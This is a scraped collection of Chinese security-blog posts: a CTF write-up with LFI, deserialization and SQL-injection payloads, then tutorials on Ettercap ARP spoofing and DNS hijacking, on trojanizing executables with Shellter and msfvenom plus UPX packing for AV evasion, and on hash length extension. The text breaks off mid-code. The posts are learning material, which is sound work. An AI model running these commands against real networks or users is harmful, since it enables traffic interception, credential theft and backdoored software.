index.php.bak，得 PHP 代码：\n\u0026lt;?php ERROR_REPORTING(0); if(!empty($_GET[\u0026#39;ver\u0026#39;])==PHP_VERSION){ if($_GET[\u0026#39;ver\u0026#39;]==PHP_VERSION){ $key = \u0026#34;**********\u0026#34;; } } ?\u0026gt; burp 抓包发现返回头中有 X-Powered-By: PHP/5.4.41，那么把 ver=5.4.41 作为参数通过 GET 请求发送即可。\nLevel5 # F12 在注释中发现存在 password.txt，查看发现是一个字典，放到 Intruder 里跑出密码为 Nsf0cuS，然后登录。不过前端有 js 限制了密码长度，修改 js 即可，或者也可以直接 Burp 发包。\n登陆成功后，在 Set-Cookie 字段中发现 newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;，base64 解码得 290bca70c7dae93db6644fa00b9d83b9.php，访问。\n在留言板界面任意留言并抓包，发现存在一个 isLogin=0 的 Cookie 和 userlevel=guest 的参数，分别修改为 1 和 root 即可。\nLevel6 # 240610708 和 QNKCDZO 的 MD5 值相同。\nLevel7 # 根据加密函数写解密程序 decode.php：\n\u0026lt;?php function decode($s) { $_ = base64_decode(strrev(str_rot13($s))); $_o = \u0026#39;\u0026#39;; for ($_0 = 0; $_0 \u0026lt; strlen($_); ++$_0) { $_c = substr($_, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_o .= $_c; } return strrev($_o); } echo decode($_GET[\u0026#39;str\u0026#39;]); ?\u0026gt; 然后本机开个服务器（我的是 8082 端口），decode.php 放在 www 目录里，访问 http://localhost:8082/decode.php?str=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas 即可。\nLevel8 # check.js 是 packer 加密，直接去掉 eval 放控制台跑一下得到 js 源码。\n_f = function () { var f = document.createElement(\u0026#34;form\u0026#34;); document.getElementById(\u0026#39;login\u0026#39;).appendChild(f); f.name = \u0026#34;login\u0026#34;; return f }(); _uname = function () { var uname = document.createElement(\u0026#34;input\u0026#34;); uname.type = \u0026#34;text\u0026#34;; uname.id = \u0026#34;uname\u0026#34;; uname.value = \u0026#39;Input Username\u0026#39;; uname.style.margin = \u0026#34;0px 0px 0px 60px\u0026#34;; _f.appendChild(uname); uname.onfocus = function () { if (this.value ==\u0026#39;Input Username\u0026#39;) this.value =\u0026#39;\u0026#39; }; uname.onblur = function () { if (this.value ==\u0026#39;\u0026#39;) this.value =\u0026#39;Input Username\u0026#39; }; return uname }(); _br = function () { var br = document.createElement(\u0026#34;br\u0026#34;); _f.appendChild(br); br = document.createElement(\u0026#34;br\u0026#34;); _f.appendChild(br); return br }(); _upass = function () { var upass = document.createElement(\u0026#34;input\u0026#34;); upass.type = \u0026#34;password\u0026#34;; upass.id = \u0026#34;upass\u0026#34;; upass.value = \u0026#39;Input Password\u0026#39;; upass.style.margin = \u0026#34;0px 0px 0px 60px\u0026#34;; _f.appendChild(upass); upass.onfocus = function () { if (this.value ==\u0026#39;Input Password\u0026#39;) this.value =\u0026#39;\u0026#39; }; upass.onblur = function () { if (this.value ==\u0026#39;\u0026#39;) this.value =\u0026#39;Input Password\u0026#39; }; return upass }(); _btn = function () { var btn = document.createElement(\u0026#34;input\u0026#34;); _f.appendChild(btn); btn.type = \u0026#34;button\u0026#34;; btn.value = \u0026#34;login\u0026#34;; btn.onclick = function () { uname = document.getElementById(\u0026#39;uname\u0026#39;).value; upass = document.getElementById(\u0026#39;upass\u0026#39;).value; if (uname ==\u0026#34;\u0026#34;) alert(\u0026#39;Please Input Username!\u0026#39;); else if (upass ==\u0026#34;\u0026#34;) alert(\u0026#39;Please Input Password!\u0026#39;); else { eval(unescape(\u0026#34;var%20strKey1%20%3D%20%22JaVa3C41ptIsAGo0DStAff%22%3B%0Avar%20strKey2%20%3D%20%22CaNUknOWThIsK3y%22%3B%0Avar%20strKey3%20%3D%20String.fromCharCode%2871%2C%2048%2C%20111%2C%20100%2C%2033%29%3B%0Aif%20%28uname%20%3D%3D%20%28strKey3%20+%20%28%28%28strKey1.toLowerCase%28%29%29.substring%280%2C%20strKey1.indexOf%28%220%22%29%29%20+%20strKey2.substring%282%2C%206%29%29.toUpperCase%28%29%29.substring%280%2C%2015%29%29%29%20%7B%0A%20%20%20%20var%20strKey4%20%3D%20%27Java_Scr1pt_Pa4sW0rd_K3y_H3re%27%3B%0A%20%20%20%20if%20%28upass%20%3D%3D%20%28strKey4.substring%28strKey4.indexOf%28%271%27%2C%205%29%2C%20strKey4.length%20-%20strKey4.indexOf%28%27_%27%29%20+%205%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Login%20Success%21%27%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27key%27%29.innerHTML%20%3D%20unescape%28%22%253Cfont%2520color%253D%2522%2523000%2522%253Ea2V5X0NoM2NrXy50eHQ%3D%253C/font%253E%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Password%20Error%21%27%29%3B%0A%20%20%20%20%7D%0A%7D%20else%20%7B%0A%20%20%20%20alert%28%27Login%20Failed%21%27%29%3B%0A%7D\u0026#34;)) } }; return false }(); 只有最后一个 else 里的代码比较重要，去掉 eval 运行得：\nvar strKey1 = \u0026#34;JaVa3C41ptIsAGo0DStAff\u0026#34;; var strKey2 = \u0026#34;CaNUknOWThIsK3y\u0026#34;; var strKey3 = String.fromCharCode(71, 48, 111, 100, 33); if (uname == (strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(\u0026#34;0\u0026#34;)) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15))) { var strKey4 = \u0026#39;Java_Scr1pt_Pa4sW0rd_K3y_H3re\u0026#39;; if (upass == (strKey4.substring(strKey4.indexOf(\u0026#39;1\u0026#39;, 5), strKey4.length - strKey4.indexOf(\u0026#39;_\u0026#39;) + 5))) { alert(\u0026#39;Login Success!\u0026#39;); document.getElementById(\u0026#39;key\u0026#39;).innerHTML = unescape(\u0026#34;%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E\u0026#34;); } else { alert(\u0026#39;Password Error!\u0026#39;); } } else { alert(\u0026#39;Login Failed!\u0026#39;); } 依次运行： 1.\nvar strKey1 = \u0026#34;JaVa3C41ptIsAGo0DStAff\u0026#34;; var strKey2 = \u0026#34;CaNUknOWThIsK3y\u0026#34;; var strKey3 = String.fromCharCode(71, 48, 111, 100, 33); var strKey4 = \u0026#39;Java_Scr1pt_Pa4sW0rd_K3y_H3re\u0026#39;; strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(\u0026#34;0\u0026#34;)) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15) strKey4.substring(strKey4.indexOf(\u0026#39;1\u0026#39;, 5), strKey4.length - strKey4.indexOf(\u0026#39;_\u0026#39;) + 5) 得到用户名 G0od!JAVA3C41PTISAGO 和密码 1pt_Pa4sW0rd_K3y_H3re，不过不用登录，因为 key 也可以直接得到。运行 unescape(\u0026quot;%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E\u0026quot;)，得到：\n\u0026lt;font color=\u0026#34;#000\u0026#34;\u0026gt;a2V5X0NoM2NrXy50eHQ=\u0026lt;/font\u0026gt; base64 解码得 key_Ch3ck_.txt，打开发现里面只有 Ch3ck_Au7h.php，但是打开发现只显示 Your username error!。因此我们 POST 刚才得到的用户名和密码。\nLevel10 # 提示 LFI，并且 html 表单中有一个 file 参数，因此考虑用 PHP 伪协议，输入框中输入：\nphp://filter/read=convert.base64-encode/resource=index.php flag 直接写死在源码中了。。\nLevel11 # 存在备份文件 index.php.swp：\nfunction clear($string){ // 这是过滤函数哦~ } $userInfo = @unserialize($_REQUEST[\u0026#39;userInfo\u0026#39;]); $query = \u0026#39;SELECT * FROM users WHERE id = \\\u0026#39;\u0026#39;.clear($userInfo[\u0026#39;id\u0026#39;]).\u0026#39;\\\u0026#39; AND password = \\\u0026#39;\u0026#39;.clear($userInfo[\u0026#39;pass\u0026#39;]).\u0026#39;\\\u0026#39;;\u0026#39;; $result = mysql_query($query); if(!$result || mysql_num_rows($result) \u0026lt;1){ die(\u0026#39;Invalid password!\u0026#39;); } $row = mysql_fetch_assoc($result); foreach($row as $key =\u0026gt; $value){ $userInfo[$key] = $value; } $oldPass = @$_REQUEST[\u0026#39;oldPass\u0026#39;]; $newPass = @$_REQUEST[\u0026#39;newPass\u0026#39;]; if($oldPass == $userInfo[\u0026#39;password\u0026#39;]){ $userInfo[\u0026#39;password\u0026#39;] = $newPass; $query = \u0026#39;UPDATE users SET pass = \\\u0026#39;\u0026#39;.clear($newPass).\u0026#39;\\\u0026#39; WHERE id = \\\u0026#39;\u0026#39;.clear($userInfo[\u0026#39;id\u0026#39;]).\u0026#39;\\\u0026#39;;\u0026#39;; mysql_query($query); echo \u0026#39;Password Changed Success.\u0026lt;br\u0026gt;\u0026#39;; } else{ echo \u0026#39;Invalid old password entered.\u0026#39;; } 首先对 userInfo 进行反序列化，随后要求两个参数 oldPass 和 newPass，后者随意设置，前者很容易得到。在 Cookie 中发现 pass=OTA0OGM1MGUwOTJmM2IyZWRlYzM5NTFiZjdiZGFlNTA%3D; id=3，进行 base64 解码和 md5 解密后得到 oldPass=20151231。\n最后就是在 payload 中构造一个序列化的 userInfo 数组，payload:\nchangepassword.php?userInfo=a:2:{s:2:\u0026#34;id\u0026#34;;i:1;s:4:\u0026#34;pass\u0026#34;;s:8:\u0026#34;20151231\u0026#34;;}\u0026amp;oldPass=20151231\u0026amp;newPass=11111111 Level12 # 备份文件 index.php.：\n\u0026lt;?php #GOAL: get password from admin; error_reporting(0); require \u0026#39;DB_config_inc.php\u0026#39;; dvwaDatabaseConnect(); $_CONFIG[\u0026#39;Security\u0026#39;]=true; //if register globals = on, undo var overwrites foreach(array(\u0026#39;_GET\u0026#39;,\u0026#39;_POST\u0026#39;,\u0026#39;_REQUEST\u0026#39;,\u0026#39;_COOKIE\u0026#39;) as $method){ foreach($$method as $key=\u0026gt;$value){ unset($$key); } } function clear($string){ //filter function here } $username = isset($_POST[\u0026#39;username\u0026#39;]) ? clear($_POST[\u0026#39;username\u0026#39;]) : die(\u0026#39;Please enter in a username.\u0026#39;); $password = isset($_POST[\u0026#39;password\u0026#39;]) ? clear($_POST[\u0026#39;password\u0026#39;]) : die(\u0026#39;Please enter in a password.\u0026#39;); if($_CONFIG[\u0026#39;Security\u0026#39;]){ $username=preg_replace(\u0026#39;#[^a-z0-9_-]#i\u0026#39;,\u0026#39;\u0026#39;,$username); $password=preg_replace(\u0026#39;#[^a-z0-9_-]#i\u0026#39;,\u0026#39;\u0026#39;,$password); } if (is_array($username)){ foreach ($username as $key =\u0026gt; $value) { $username[$key] = $value; } } $query=\u0026#39;SELECT * FROM users WHERE user=\\\u0026#39;\u0026#39;.$username[0].\u0026#39;\\\u0026#39; AND password=\\\u0026#39;\u0026#39;.$password.\u0026#39;\\\u0026#39;;\u0026#39;; $result=mysql_query($query); if($result \u0026amp;\u0026amp; mysql_num_rows($result) \u0026gt; 0){ echo(\u0026#39;flag:{*********}\u0026#39;); exit(); } else{ echo(\u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Invalid password!\\\u0026#34;)\u0026lt;/script\u0026gt;\u0026#34;); exit(); } ?\u0026gt; 如果 $_CONFIG['security'] 为 true，那么我们无法传入 username 和 password，因此需要覆盖 $_CONFIG。随后就是注入了，payload:\nusername=\u0026#39;\u0026amp;password=||1=1#\u0026amp;Submit=%E6%8F%90%E4%BA%A4\u0026amp;_CONFIG=aaa Level13 # 经测试，只有 php5 后缀的文件可以上传成功，但是经过一段很短的延时后又会被删掉。所以需要写两个脚本，一个上传一个下载同时进行，最后发现下载下来的刚才上传的文件里包含 flag。\nDay4 \u0026amp; Day5 # 练习赛，没来得及记录具体 writeup，靠回忆整理一点工具的使用。\nJohn 破解 DES # john des.txt john --show des.txt John 破解 Windows 管理员密码 # 注：Windows 下散列函数为 NTLM。\njohn --format=NT sam.txt Python 库 Steganography 命令行使用 # steganography -e input.jpg output.jpg \u0026#39;flag{..}\u0026#39; steganography -d stego.png F5-Steganography 使用 # java Extract stego.jpg -p 123456 steghide 使用 # steghide embed -cf picture.jpg -ef secret.txt steghide extract -sf picture.jpg 图片隐写压缩包 / 图片 # copy /b 1.jpg+1.zip new.jpg copy /b 2.jpg+3.jpg 23.jpg RSA - 已知 p,q,e # 如果只知道 n 且 n 位数不大，可以在线分解得 p,q。\nimport gmpy2 p = ... q = ... e = ... c = ... # c = pow(m, e, p*q) d = gmpy2.invert(e, (p-1)*(q-1)) m = pow(c, d, p*q) Misc - 未知领域 # 例如对于流量包，vmdk 文件，apk 文件等等不熟悉的文件的分析，部分简单题可以通过文本编辑器打开并搜索字符串。对于损坏的流量包尤为有效。\n哈希还原 # 给定明文范围和哈希前十个字符，求明文与哈希值。简陋的 php 版本：\n\u0026lt;?php $str = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $len = strlen($str); for($i = 0; $i \u0026lt; $len-1; ++$i) { for($j = 0; $j \u0026lt; $len-1; ++$j) { for($k = 0; $k \u0026lt; $len-1; ++$k) { for($l = 0; $l \u0026lt; $len-1; ++$l) { $ret = md5($str[$i].$str[$j].$str[$k].$str[$l]); if(substr($ret, 0, 10) == \u0026#39;c2979c7124\u0026#39;) { echo $ret; die(); } } } } } ?\u0026gt; 比较舒服的 python 版本：\nimport hashlib import itertools key = \u0026#39;c2979c7124\u0026#39; dir = \u0026#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; dir_list = itertools.product(dir, repeat=4) for i in dir_list: res = hashlib.md5(\u0026#39;\u0026#39;.join(i)).hexdigest() if res[0:10] == key: print i print res SQL 注入流量包分析 # 过滤出 http 数据包。 定位关键的注入数据包所在的区间，观察注入语句判断是否是盲注。 非盲注：关注响应信息，直接在响应信息中得到 flag。 盲注：关注注入语句，导出 HTTP 对象到 txt 并写脚本分析出 flag。 总结 # 暑期学校主要还是面向零基础的同学，因此能学到的东西不算太多。接下来应该会重点学习各类工具的使用。\n","date":"2019-07-23","permalink":"/posts/summer-school/","section":"Posts","summary":"\u003cp\u003e7.22-7.26，收获不大。\u003c/p\u003e","title":"ECNU X 启明星辰 网络安全暑期学校记录"},{"content":"没有什么坑点。\nBeef 加载 Metasploit 插件 # 修改 beef 的配置文件 /usr/share/beef-xss/config.yaml，找到 extension 下的 metasploit 字段，修改为 true。此外，建议修改 credentials 下的密码字段。\n随后修改 /usr/share/beef-xss/extensions/metasploit/config.yaml，找到 beef-\u0026gt;extension-\u0026gt;metasploit 下的 host 和 callback_host 字段，都改为虚拟机的内网 IP。最后，在倒数第二行找到：\n{ \u0026#34;os\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;\u0026#34; } 改为：\n{ \u0026#34;os\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/usr/share/metasploit-framework/\u0026#34; } 配置文件修改完后，启动 msfconsole，输入：\n$ load msgrpc ServerHost=192.168.159.135 Pass=abc123 来启用 msgrpc 插件。其中 ServerHost 字段是本机内网 IP，Pass 字段默认是 abc123，可以在上面的 /usr/share/beef-xss/extensions/metasploit/config.yaml 里修改。\n回到 beef-xss 目录里运行 ./beef -x，使得修改后的配置文件生效。至此，MSF 插件已经加载完毕。\nMetasploit 连接 PostgreSQL # $ service postgresql start $ msfdb init 这样两步就够了，检查是否成功：\n$ msfconsole $ db_status 连接以后就可以使用 PostgreSQL 存储我们收集到的信息了，例如在 msfconsole 中执行 nmap 不会影响数据库，但 db_nmap 的结果则会存到数据库里。\n","date":"2019-07-21","permalink":"/posts/beef-msf/","section":"Posts","summary":"\u003cp\u003e没有什么坑点。\u003c/p\u003e","title":"Beef 加载 Metasploit 插件 \u0026 Metasploit 连接 PostgreSQL"},{"content":"关于 Ettercap 的有趣例子。\n安装与配置 # 安装很容易：\n$ apt install ettercap-text-only 使用前需要修改配置，给予 Ettercap 足够的权限。配置文件位于 /etc/ettercap/etter.conf，找到：\n[priv] ec_uid = 65500 ec_gid = 65500 将两个值都修改为 0，表示给予 root 权限。\n另外，如果想嗅探 https 包则需要根据配置文件的提示去除指定的注释。我这里使用的是 Linux 系统，防火墙为 iptables，所以我取消注释了 177 和 178 两行。\n# if you use iptables: redir_command_on = \u0026#34;iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\u0026#34; redir_command_off = \u0026#34;iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\u0026#34; ARP 欺骗 # 我们知道，ARP 请求包是广播发送的，然而 ARP 应答包则是单播发送的。因此通过 Ettercap，我们可以在收到同一网段内的其它主机广播的 ARP 请求后，向它们发送 ARP 应答包，使它们认为我们的主机就是网关。这样一来，任何发送至外网的请求都将经过我们的主机。\n如果我们成功实施了 ARP 欺骗，作为一个伪网关，就可以截获同网段内所有发送至外网的流量。我们可以选择不再将这些数据包转发至外网，这将使得该网段内所有其它主机无法上网：\n$ arpspoof -i eth0 -t 192.168.159.128 192.168.159.2 其中 -i 指定网卡接口，-t 指定要欺骗的目标主机，最后的 IP 地址是本网段内真正的网关地址。如何查看真正的网关地址呢？\n简便的方法是直接查看当前连接的网络属性，里面会直接显示 默认网关 字段。另一种方法是 traceroute 任意外网网址 ，这样第一跳的地址必定是网关地址。\n$ traceroute baidu.com traceroute to baidu.com (123.125.114.144), 30 hops max, 60 byte packets 1 _gateway (192.168.159.2) 0.947 ms 0.819 ms 0.681 ms^C 结果：\n或者，我们照常转发流量（这个操作由 Ettercap 自动完成），但是将数据包中的图片存储下来：\n$ ettercap -i eth0 -Tq -M arp:remote /// /// $ driftnet -i eth0 -b -a -d pic 其中 -T 表示只使用命令行，-q 表示不显示具体数据包信息，-M 指定使用的模式，/// 表示同网段下所有主机，-b 表示声音提醒，-a 保存图片，-d 指定保存目录。\n由于 Ettercap 截获的是整个数据包，因此常常可以获取比图片更敏感的信息。举个例子，假设我们已经开始 ARP 欺骗：\n$ ettercap -i eth0 -Tq -M arp:remote /// /// 这时，同网段主机访问了一个 http 网站并进行登录。我们可以在命令行看到：\n由于帐号和密码是明文传输的，我们可以轻易得到帐号 10175101282 和密码 aaaaaa。\nDNS 劫持 # 作为伪网关，我们当然也可以将一些域名解析到指定的 IP，实现 DNS 劫持。首先修改另一个配置文件 /etc/ettercap/etter.dns，在这里面可以输入域名匹配规则与解析规则，如:\n*.edu.cn A 192.168.159.135 可以看出，前面是一个类正则的域名匹配规则，然后中间指定 A Record，最后指定要解析到哪个 IP 地址上，这里我们使用了攻击者主机内网 IP。\n保存后，我们在本机开一个服务器：\n$ service apache2 start 然后开始 DNS 劫持：\n$ ettercap -i eth0 -Tq -P dns_spoof /// /// 当受害者主机访问类似 aaa.ecnu.edu.cn 的域名时，将会看到我们的 Apache 服务器的默认页面，这样就完成了 DNS 劫持。命令行提示：\ndns_spoof: A [aaa.ecnu.edu.cn] spoofed to [192.168.159.135] 结果：\n小结 # 显然上述攻击都有一个共同的前提，那就是攻击者和受害者处于同一网段。由此不难发现，局域网内的安全是十分脆弱的，这是由局域网内主机互相访问的便利性所带来的代价，而如何防护这类攻击是需要进一步思考的问题。\n","date":"2019-07-20","permalink":"/posts/ettercap/","section":"Posts","summary":"\u003cp\u003e关于 Ettercap 的有趣例子。\u003c/p\u003e","title":"Ettercap 简易入门"},{"content":"记录一下最简单的挂后门和免杀方法，不怎么接触这块。\n主要介绍两个工具：Shellter 和 Upx，后者 Kali 自带。Shellter 的安装略有点复杂，因为需要 wine32 的支持。使用的 Kali 是 64 位的。\n首先 apt install shellter 应该不会有什么问题，但是启动的时候会提示缺少 wine32，因此执行：\n$ dpkg --add-architecture i386 \u0026amp;\u0026amp; apt-get update \u0026amp;\u0026amp; apt-get install wine32 这一步会花费很长时间，因为 wine 本身很庞大。装完后应该就可以正常使用了。\n通过 Shellter 篡改 exe 文件 # 随意取一个 exe 文件作为我们要加入后门的可执行文件。首先启动 shellter，会看到： 输入 A 选择自动模式，随后输入 exe 文件所在路径，程序便会自动运行，分析原文件并插入恶意代码。这个过程大约持续不到一分钟。\n输入 Y 开启隐蔽模式，随后选择使用它列出的七种 payload 还是自定义，这里我们输入 L 选择列出的 payload。\n带 Meterpreter 前缀的是指可以通过 MSF 获取会话的 payload，方式有正向 Bind 与反向 Reverse 两种。Bind 顾名思义，就是用户打开 exe 后，将会在用户主机上开放一个端口，攻击者去连接那个端口就可以获取会话。Reverse 则是反过来，使用户主机连接攻击者开放的端口来获取会话。而带 Shell 前缀的 payload 可以直接反弹 shell 给攻击者。\n攻击者还可以通过不同的协议来获取会话，比如任意 TCP 协议，HTTP/HTTPS 协议等。这里以选择 4 号 payload Meterpreter_Bind_TCP 为例。\n最后要求设置 LPORT 也就是要在目标主机上打开的端口，只要是没有被占用的端口都可以，比如这里可以设置 60000 端口。\n完成以后，新的 exe 文件就是已经被植入后门的 exe 文件，相比于原文件，它占空间多了一点，其它地方似乎看不出什么区别。\n通过 Meterpreter 获取会话 # 假设目标主机（Windows）获得了新的 exe 文件。在双击打开前，我们查看用 netstat -an 查看其已经开放的端口：\nActive Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* 然后我们双击打开，发现和原来的 exe 完全没有区别。再次查看端口情况可以发现，60000 端口悄悄开启了：\nActive Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:60000 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* 接下来我们看看攻击者要怎么操作来获取会话。\n首先要确保攻击者和目标主机在同一网段。打开 msfconsole。依次输入：\nuse exploit/multi/handler set payload windows/meterpreter/bind_tcp set lport 60000 set rhost 192.168.159.128 exploit 其中 rhost 需要改为目标主机的内网 IP。\n这样以后，就可以获取会话，并执行任意命令了（会话的作用不局限于执行 shell 命令）： 需要注意的是，一旦用户关闭 exe 文件，会话也将随之关闭。因此实际场景中常常配合持久化提权工具使用。\n使用 msfvenom 直接生成带后门的 PE 文件 # 上面的例子需要修改一个已有的 exe 文件，这里我们可以直接生成这样的带后门的文件：\n$ msfvenom -p windows/meterpreter/bind_tcp lport=60001 -f exe \u0026gt; test.exe 端口号依然可以是任意未被占用的端口。msfvenom 也提供了许多选项实现免杀，这里不一一介绍了。\n使用 Upx 给程序加壳 # 这样做的作用主要有两个：压缩文件大小和免杀。然而 Upx 加壳毕竟是最最简单的免杀方法，现在的绝大多数杀毒软件都能轻易脱壳。举个例子，给刚才生成的 exe 文件加壳，只需要：\n$ upx -9 test.exe -1 参数压缩得最快，-9 参数压缩质量最高。\n后记 # 这篇文章叙述的方法是最初级的植入后门的方法，略过了很多有一定难度的细节，详情参见 Shellter/Upx/msfvenom 的文档。\n","date":"2019-07-19","permalink":"/posts/shellter-upx/","section":"Posts","summary":"\u003cp\u003e记录一下最简单的挂后门和免杀方法，不怎么接触这块。\u003c/p\u003e","title":"简单的 PE 后门"},{"content":"简单翻译了 hash_extender 的 README 文档。\n背景 # 哈希长度扩展攻击是对消息认证码 MAC 的攻击，我们令其中使用的哈希函数为 H，则该攻击针对的是形如 H(secret || data) 这类 MAC，其中 || 是连接符。容易受到攻击的哈希函数包括但不限于：\nMD4 MD5 RIPEMD-160 SHA-0 SHA-1 SHA-256 SHA-512 WHIRLPOOL 然而，MD2/SHA-224/SHA-384 不会受到该攻击。\n攻击者在不知道 secret 的情况下，仍能产生合法的 H(secret || data || attacker_controlled_data) 的值。这是由于上述易受攻击的哈希函数都拥有类似 “断点续传” 的能力：即上一轮哈希函数的输出所包含的信息，足以用来继续进行下一轮哈希计算。攻击者所做的，不过是接手了继续计算哈希的任务而已。\n简而言之，给定一个 “一个未知前缀 + 一个字符串” 的哈希值，攻击者可以在字符串后加上任意后缀，生成新的哈希值而不改变原来的未知前缀。\n例子 # secret = \u0026#39;secret\u0026#39; data = \u0026#39;data\u0026#39; H = md5() signature = H(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b append = \u0026#39;append\u0026#39; 服务器将 data 和 signature 发送到客户端，攻击者可以猜测（或通过其他方式）使用的哈希函数为 MD5，因为返回的哈希值长 32 位，而 MD5 是最常用的 128-bit 哈希函数。\n已知 data，signature，H 这三个参数，攻击者想要将 append 添加到 data 后面，然后生成新的合法哈希值，要怎么做呢？\n填充 # 在讨论实际的攻击前，不得不先说说哈希函数中的填充问题。\n计算 H(secret || data) 时，字符串 secret || data 会被填充，填充使用的是一位 1 和若干位 0，紧随其后的是十六进制表示的字符串的长度。也就是一个 0x80 字节，加上若干个 0x00 字节，再加上表示长度的若干字节。后两者的字节数，以及长度如何表示，取决于具体的哈希函数和分组的大小。\n对于大多数哈希函数（包括 MD4,MD5,RIPEMD-160,SHA-0,SHA-1 和 SHA-256），字符串会被填充至长度 len，使得 len===56(mod 64) 字节，也就是比分组大小 64 字节少 8 字节。少掉的 8 字节用来存放长度。hash_extender 中有两个例外：SHA-512 分组大小为 128 字节、并用 16 字节表示长度；WHIRLPOOL 分组大小为 64 字节、并用 32 字节表示长度。\n此外，MD4,MD5,RIPEMD-160 使用小端法表示长度，而 SHA 家族和 WHIRLPOOL 用大端法。\n在我们的例子中，len(secret || data) = len('secretdata') = 10 字节，或者说 80(0x50) 位。于是我们有：10 字节的数据 secretdata，46 字节填充 0x80 0x00 0x00 ...，以及 8 字节小端法表示的长度字段 50 00 00 00 00 00 00 00，共 64 字节：\n0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 攻击 # 现在我们有了要哈希的数据，我们来看看如何实现攻击。\n首先我们把 append 加到后面，很简单：\n0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 0040 61 70 70 65 6e 64 append 这样一块数据的哈希值是我们最终想要：\n计算出来的 让服务器计算的 要计算该哈希值，有两种方法：\n放进一个 buffer 里，然后调用 H(buffer) 从第一个分组的末尾开始，使用我们从 signature 中已知的状态信息，然后从那个状态开始对 append 作哈希运算 第一种方法是服务器将采用的，而第二种就是攻击者要采用的。我们先看服务器端，因为更简单一点。\n服务器端计算 # 我们知道服务器会把 secret 放到字符串前面，所以我们把去掉 secret 后的消息发过去：\n0000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............ 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append 注意到这里的数据正好 64 字节——不要被迷惑了，这只是因为 secret 和 append 正好长度相同的关系。或许我不应该选这个例子，但我懒得重来了。。\n服务器把 secret 作为前缀：\n0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 0040 61 70 70 65 6e 64 append 然后计算得到哈希值：\n6ee582a1669ce442f3719c47430dadee 你可以用如下代码验证：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { MD5_CTX c; unsigned char buffer[MD5_DIGEST_LENGTH]; int i; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c,\u0026#34;secret\u0026#34;, 6); MD5_Update(\u0026amp;c,\u0026#34;data\u0026#34; \u0026#34;\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;append\u0026#34;, 64); MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { 